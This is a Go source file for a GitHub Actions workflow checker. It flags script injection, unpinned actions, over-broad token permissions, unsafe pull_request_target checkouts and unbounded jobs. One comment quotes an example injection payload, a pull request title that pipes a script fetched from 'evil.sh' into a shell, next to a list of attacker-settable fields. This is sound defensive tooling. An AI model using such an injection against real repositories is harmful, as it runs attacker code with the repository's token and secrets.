// Package workflow parses GitHub Actions workflows and checks them.
//
// # Why a parser and not a page of YAML examples
//
// Every other module in this repo checks its claims with a test. A workflow module made of annotated YAML
// would be the one place a reader has to take my word, and annotated YAML goes stale the moment the workflow
// changes.
//
// So this is a small checker. It reads a workflow, models the parts that matter, and reports the problems that
// actually bite: an expression interpolated into a shell script, an unpinned third-party action, a missing
// permissions block, a job that will run forever because nothing bounds it.
//
// The tests then point it at THIS REPOSITORY'S OWN ci.yml. That makes the module self-checking: the claims are
// about a file that exists, that runs on every push, and that a reader can open.
//
// # What a workflow is
//
// A YAML file in .github/workflows. `on` says what triggers it, `jobs` are containers that run in parallel
// unless `needs` orders them, and `steps` inside a job run in sequence on one machine. `uses` runs someone
// else's action, `run` runs a shell command.
//
// Two facts that shape everything below. A job gets a fresh machine, so nothing survives between jobs except
// what you upload as an artifact or write to a cache. And a workflow file is code that runs with a token that
// can write to the repository, which is why half of this package is about who can make it run.
package workflow

import (
	"errors"
	"fmt"
	"os"
	"regexp"
	"slices"
	"sort"
	"strings"

	"go.yaml.in/yaml/v3"
)

// Workflow is the part of a workflow file this package models.
//
// # Why On is a yaml.Node
//
// `on` is three different types in the schema. It can be a string (`on: push`), a list
// (`on: [push, pull_request]`) or a map (`on: {push: {branches: [main]}}`). YAML has no union, so the node is
// kept raw and Triggers decodes whichever shape turned up.
//
// It is also, famously, parsed as the BOOLEAN TRUE by a YAML 1.1 parser, because `on`, `off`, `yes` and `no`
// are booleans in that version. yaml.v3 implements YAML 1.2 where only `true` and `false` are, so `on` stays a
// string here. A tool written against a 1.1 parser has to look for the key `true`, which is one of the stranger
// things in this ecosystem.
type Workflow struct {
	Name        string            `yaml:"name"`
	On          yaml.Node         `yaml:"on"`
	Permissions yaml.Node         `yaml:"permissions"`
	Concurrency yaml.Node         `yaml:"concurrency"`
	Env         map[string]string `yaml:"env"`
	Jobs        map[string]Job    `yaml:"jobs"`
}

// Job is one job in a workflow.
type Job struct {
	Name            string            `yaml:"name"`
	RunsOn          yaml.Node         `yaml:"runs-on"`
	Needs           yaml.Node         `yaml:"needs"`
	If              string            `yaml:"if"`
	Permissions     yaml.Node         `yaml:"permissions"`
	Steps           []Step            `yaml:"steps"`
	Strategy        *Strategy         `yaml:"strategy"`
	Env             map[string]string `yaml:"env"`
	Outputs         map[string]string `yaml:"outputs"`
	Container       yaml.Node         `yaml:"container"`
	Environment     yaml.Node         `yaml:"environment"`
	With            map[string]any    `yaml:"with"`
	Secrets         yaml.Node         `yaml:"secrets"`
	Defaults        yaml.Node         `yaml:"defaults"`
	Concurrency     yaml.Node         `yaml:"concurrency"`
	ContinueOnError yaml.Node         `yaml:"continue-on-error"`

	// Services are containers GitHub starts beside the job and tears down after it: a Postgres, a Redis, a
	// Kafka. They are a map from a name to an image plus options, and the name becomes the HOSTNAME a
	// container-based job reaches it at. A job running directly on the runner reaches them on localhost
	// through the published ports instead, which is the difference that makes a connection string work in one
	// job and not another.
	Services map[string]Service `yaml:"services"`

	// TimeoutMinutes bounds the job. Without it the limit is GitHub's default of 360 minutes, so a hung test
	// burns six hours of runner time before anyone notices.
	TimeoutMinutes int `yaml:"timeout-minutes"`

	// Uses on a JOB means a reusable workflow, not an action. A job with `uses` has no `steps`, and the
	// difference between that and a composite action is where it runs: a reusable workflow gets its own
	// runners and its own jobs, a composite action runs as steps inside the calling job.
	Uses string `yaml:"uses"`
}

// Step is one step in a job.
type Step struct {
	Name string            `yaml:"name"`
	Uses string            `yaml:"uses"`
	Run  string            `yaml:"run"`
	With map[string]any    `yaml:"with"`
	Env  map[string]string `yaml:"env"`
	If   string            `yaml:"if"`

	// WorkingDirectory changes where `run` executes. It does NOT affect `uses`, which is a frequent surprise:
	// an action reads its inputs, not the shell's cwd.
	WorkingDirectory string `yaml:"working-directory"`

	Shell           string    `yaml:"shell"`
	ID              string    `yaml:"id"`
	ContinueOnError yaml.Node `yaml:"continue-on-error"`
	TimeoutMinutes  int       `yaml:"timeout-minutes"`
}

// Service is a container started alongside a job.
type Service struct {
	Image string            `yaml:"image"`
	Env   map[string]string `yaml:"env"`
	Ports []string          `yaml:"ports"`

	// Options is a string of docker run flags. It is where a health check goes, and it is a STRING rather
	// than a structure, so a typo in a flag is a runtime failure inside Docker rather than a schema error.
	Options string `yaml:"options"`

	Credentials map[string]string `yaml:"credentials"`
	Volumes     []string          `yaml:"volumes"`
}

// HasHealthCheck reports whether a service container waits for the service to be ready.
//
// # Why this matters more than it looks
//
// Without one, the service is "available" as soon as the CONTAINER starts, which is before Postgres accepts
// connections. A test that connects in that window fails, or, in a repository like this one where every
// database test skips without a database, SKIPS AND PASSES. The second is worse: the job is green and ran
// nothing.
func (s Service) HasHealthCheck() bool {
	return strings.Contains(s.Options, "--health-cmd")
}

// Strategy is a job's matrix.
type Strategy struct {
	// FailFast defaults to TRUE, which cancels every other matrix leg the moment one fails. That is right for
	// a slow expensive matrix and wrong for a compatibility matrix, where the useful information is exactly
	// which legs fail.
	FailFast *bool     `yaml:"fail-fast"`
	Matrix   yaml.Node `yaml:"matrix"`
}

// Parse reads a workflow file.
func Parse(path string) (*Workflow, error) {
	data, err := os.ReadFile(path) //nolint:gosec // the caller names the file; this is a checker, not a server
	if err != nil {
		return nil, err
	}

	return ParseBytes(data)
}

// ParseBytes reads a workflow from memory.
//
// KnownFields is on, so a key the model does not have is an error rather than silence. That is deliberate: the
// commonest workflow bug is a misspelled key, and GitHub ITSELF rejects unknown top-level keys but happily
// accepts a misspelled key inside `with`, where it becomes an input the action ignores.
func ParseBytes(data []byte) (*Workflow, error) {
	var w Workflow

	dec := yaml.NewDecoder(strings.NewReader(string(data)))
	dec.KnownFields(true)

	if err := dec.Decode(&w); err != nil {
		return nil, fmt.Errorf("parse workflow: %w", err)
	}

	return &w, nil
}

// Triggers returns the event names in `on`, whichever of the three shapes was used.
func (w *Workflow) Triggers() ([]string, error) {
	switch w.On.Kind {
	case 0:
		return nil, errors.New("workflow: no `on` key, so nothing can trigger it")

	case yaml.ScalarNode:
		return []string{w.On.Value}, nil

	case yaml.SequenceNode:
		out := make([]string, 0, len(w.On.Content))
		for _, n := range w.On.Content {
			out = append(out, n.Value)
		}

		return out, nil

	case yaml.MappingNode:
		// A mapping alternates key, value, key, value.
		out := make([]string, 0, len(w.On.Content)/2)
		for i := 0; i < len(w.On.Content); i += 2 {
			out = append(out, w.On.Content[i].Value)
		}

		sort.Strings(out)

		return out, nil

	default:
		return nil, fmt.Errorf("workflow: `on` is a %v, which is none of the three legal shapes", w.On.Kind)
	}
}

// NeedsOf returns a job's dependencies, from either shape (`needs: build` or `needs: [build, lint]`).
func (j Job) NeedsOf() []string {
	switch j.Needs.Kind {
	case yaml.ScalarNode:
		return []string{j.Needs.Value}

	case yaml.SequenceNode:
		out := make([]string, 0, len(j.Needs.Content))
		for _, n := range j.Needs.Content {
			out = append(out, n.Value)
		}

		return out

	default:
		return nil
	}
}

// Finding is one problem found in a workflow.
type Finding struct {
	Job     string
	Step    string
	Rule    string
	Message string
}

func (f Finding) String() string {
	where := f.Job
	if f.Step != "" {
		where += "/" + f.Step
	}

	if where == "" {
		where = "workflow"
	}

	return fmt.Sprintf("%s [%s]: %s", where, f.Rule, f.Message)
}

// expressionInRun finds ${{ ... }} inside a run block.
var expressionInRun = regexp.MustCompile(`\$\{\{\s*([^}]+?)\s*\}\}`)

// attackerControlled lists the expression contexts an outside contributor can set.
//
// # Why this list and not "anything from github.event"
//
// Most of github.event is fixed by GitHub: the repository name, the sha, the ref. These are the fields a person
// writes, so these are the fields that can contain a shell metacharacter. A pull request title is the classic:
// open a PR called `"; curl evil.sh | sh; #` against a repo whose workflow interpolates it into a run block,
// and the workflow executes it with the repository's token.
//
// The list is not exhaustive, which is why the checker matches on prefixes. head_ref is on it because a BRANCH
// NAME can contain almost anything, and a fork's branch names are chosen by the fork's owner.
var attackerControlled = []string{
	"github.event.issue.title",
	"github.event.issue.body",
	"github.event.pull_request.title",
	"github.event.pull_request.body",
	"github.event.pull_request.head.ref",
	"github.event.pull_request.head.label",
	"github.event.comment.body",
	"github.event.review.body",
	"github.event.review_comment.body",
	"github.event.discussion.title",
	"github.event.discussion.body",
	"github.event.head_commit.message",
	"github.event.head_commit.author.name",
	"github.event.head_commit.author.email",
	"github.event.commits",
	"github.head_ref",
}

// Check runs every rule over a workflow and returns what it found.
//
// The findings are sorted, so a test can compare them and a reader gets the same output twice.
func Check(w *Workflow) []Finding {
	var findings []Finding

	findings = append(findings, checkPermissions(w)...)
	findings = append(findings, checkTriggers(w)...)

	for name, job := range w.Jobs {
		findings = append(findings, checkJob(name, job)...)
	}

	sort.Slice(findings, func(i, j int) bool {
		if findings[i].Job != findings[j].Job {
			return findings[i].Job < findings[j].Job
		}

		if findings[i].Rule != findings[j].Rule {
			return findings[i].Rule < findings[j].Rule
		}

		return findings[i].Message < findings[j].Message
	})

	return findings
}

// checkPermissions looks for a missing or over-broad token scope.
//
// # What the default is
//
// GITHUB_TOKEN's default permissions are a repository setting. For repositories created before 2023 the default
// is READ AND WRITE on everything, which means a workflow that only needs to read code can push to it. Newer
// repositories default to read-only, and an organisation can set either.
//
// Since a workflow file cannot see that setting, the only safe thing is to declare what it needs. A top-level
// `permissions:` block also sets the default for every job, and a job can narrow it further.
func checkPermissions(w *Workflow) []Finding {
	if w.Permissions.Kind != 0 {
		if w.Permissions.Kind == yaml.ScalarNode && w.Permissions.Value == "write-all" {
			return []Finding{{
				Rule:    "permissions",
				Message: "`permissions: write-all` grants every scope; name the ones the workflow uses",
			}}
		}

		return nil
	}

	// A job-level block on every job is equally good.
	for _, job := range w.Jobs {
		if job.Permissions.Kind == 0 {
			return []Finding{{
				Rule: "permissions",
				Message: "no `permissions:` block, so the token's scope is whatever the repository setting is, " +
					"which on an older repository is write to everything",
			}}
		}
	}

	return nil
}

// checkTriggers looks for the pull_request_target trap.
//
// # The most dangerous trigger in Actions
//
// pull_request runs with a read-only token and no secrets, for a good reason: the code being tested came from
// a stranger. pull_request_target runs the workflow from the BASE branch with a full token and secrets, so it
// exists for workflows that need to label or comment on a PR.
//
// The trap is checking out the PR's head inside one. That combines attacker-supplied code with a writable
// token, and a `go test ./...` or an `npm install` then runs the attacker's script with it. This is not
// theoretical; it is the shape of several real supply-chain compromises.
func checkTriggers(w *Workflow) []Finding {
	triggers, err := w.Triggers()
	if err != nil {
		return []Finding{{Rule: "on", Message: err.Error()}}
	}

	if !slices.Contains(triggers, "pull_request_target") {
		return nil
	}

	var findings []Finding

	for name, job := range w.Jobs {
		for _, step := range job.Steps {
			if !strings.HasPrefix(step.Uses, "actions/checkout@") {
				continue
			}

			ref, _ := step.With["ref"].(string)
			if ref == "" {
				continue
			}

			if strings.Contains(ref, "head") || strings.Contains(ref, "merge") {
				findings = append(findings, Finding{
					Job:     name,
					Step:    stepName(step),
					Rule:    "pull_request_target",
					Message: "checks out the pull request's own code while holding a writable token and the repository secrets",
				})
			}
		}
	}

	return findings
}

// checkJob runs the per-job rules.
func checkJob(name string, job Job) []Finding {
	var findings []Finding

	if job.TimeoutMinutes == 0 && job.Uses == "" {
		findings = append(findings, Finding{
			Job:     name,
			Rule:    "timeout",
			Message: "no `timeout-minutes`, so a hung step runs for GitHub's default of 360 minutes",
		})
	}

	if job.Strategy != nil && job.Strategy.Matrix.Kind != 0 && job.Strategy.FailFast == nil {
		findings = append(findings, Finding{
			Job:  name,
			Rule: "fail-fast",
			Message: "a matrix with the default `fail-fast: true` cancels every other leg on the first failure, " +
				"which hides the rest of the compatibility picture",
		})
	}

	for _, step := range job.Steps {
		findings = append(findings, checkStep(name, step)...)
	}

	return findings
}

// checkStep runs the per-step rules.
func checkStep(job string, step Step) []Finding {
	var findings []Finding

	if step.Run != "" {
		for _, m := range expressionInRun.FindAllStringSubmatch(step.Run, -1) {
			expr := strings.TrimSpace(m[1])

			for _, ctx := range attackerControlled {
				if !strings.HasPrefix(expr, ctx) {
					continue
				}

				findings = append(findings, Finding{
					Job:  job,
					Step: stepName(step),
					Rule: "script-injection",
					Message: fmt.Sprintf(
						"`%s` is interpolated into a shell script; pass it through `env:` and use \"$VAR\" instead",
						expr),
				})

				break
			}
		}
	}

	if step.Uses != "" {
		findings = append(findings, checkUses(job, step)...)
	}

	return findings
}

// versionRef matches a tag or branch reference, as opposed to a commit sha.
var commitSHA = regexp.MustCompile(`^[0-9a-f]{40}$`)

// checkUses looks at how an action is pinned.
//
// # Three ways to pin, and what each one trusts
//
//   - `@v4` trusts the action's owner not to move the tag. Tags are mutable, so a compromised maintainer
//     account can repoint v4 at anything and every workflow on the internet picks it up on the next run.
//   - `@v4.1.7` is the same trust with a smaller blast radius, because the exact tag is less likely to move.
//   - `@<40 hex characters>` trusts nothing. A sha cannot be repointed, so the code that runs is the code you
//     reviewed, and the cost is that Dependabot has to bump it for you.
//
// actions/* and github/* are GitHub's own and are held to a lower bar here, which is a judgement call rather
// than a rule: the account that would have to be compromised is GitHub's.
func checkUses(job string, step Step) []Finding {
	uses := step.Uses

	if strings.HasPrefix(uses, "./") || strings.HasPrefix(uses, "docker://") {
		return nil
	}

	owner, ref, found := strings.Cut(uses, "@")
	if !found {
		return []Finding{{
			Job:     job,
			Step:    stepName(step),
			Rule:    "unpinned-action",
			Message: fmt.Sprintf("`%s` has no version at all, so it runs whatever is on the default branch", uses),
		}}
	}

	if commitSHA.MatchString(ref) {
		return nil
	}

	if strings.HasPrefix(owner, "actions/") || strings.HasPrefix(owner, "github/") {
		return nil
	}

	return []Finding{{
		Job:     job,
		Step:    stepName(step),
		Rule:    "unpinned-action",
		Message: fmt.Sprintf("`%s` is pinned to a mutable tag; a commit sha cannot be repointed", uses),
	}}
}

// stepName gives a step something to be called in a finding.
func stepName(s Step) string {
	switch {
	case s.Name != "":
		return s.Name
	case s.Uses != "":
		return s.Uses
	default:
		first, _, _ := strings.Cut(strings.TrimSpace(s.Run), "\n")
		if len(first) > 40 {
			first = first[:40] + "..."
		}

		return first
	}
}

// Order returns the jobs in an order that respects `needs`, and reports a cycle.
//
// # Why this is worth having
//
// `needs` is the only ordering in a workflow. Everything else runs at once, and a reader looking at a file with
// nine jobs cannot see the shape without tracing the edges by hand. This is a topological sort, so it both
// prints the shape and catches a cycle, which GitHub reports as a vague "the workflow is not valid".
func Order(w *Workflow) ([]string, error) {
	remaining := make(map[string][]string, len(w.Jobs))
	for name, job := range w.Jobs {
		remaining[name] = job.NeedsOf()
	}

	var out []string

	for len(remaining) > 0 {
		var ready []string

		for name, needs := range remaining {
			satisfied := true

			for _, n := range needs {
				if _, pending := remaining[n]; pending {
					satisfied = false
					break
				}
			}

			if satisfied {
				ready = append(ready, name)
			}
		}

		if len(ready) == 0 {
			stuck := make([]string, 0, len(remaining))
			for name := range remaining {
				stuck = append(stuck, name)
			}

			sort.Strings(stuck)

			return nil, fmt.Errorf("workflow: `needs` has a cycle among %v", stuck)
		}

		// Sorted, so the output is the same on every run. Go's map iteration is deliberately random and a
		// checker that prints a different order each time is a checker nobody can diff.
		sort.Strings(ready)
		out = append(out, ready...)

		for _, name := range ready {
			delete(remaining, name)
		}
	}

	return out, nil
}

// UndeclaredNeeds returns `needs` entries naming a job that does not exist.
//
// GitHub rejects these, but only when the workflow runs, and the message names the job and not the file. A
// renamed job with a stale reference somewhere else is the usual cause.
func UndeclaredNeeds(w *Workflow) []string {
	var bad []string

	for name, job := range w.Jobs {
		for _, n := range job.NeedsOf() {
			if _, ok := w.Jobs[n]; !ok {
				bad = append(bad, fmt.Sprintf("%s needs %q, which is not a job in this workflow", name, n))
			}
		}
	}

	sort.Strings(bad)

	return bad
}
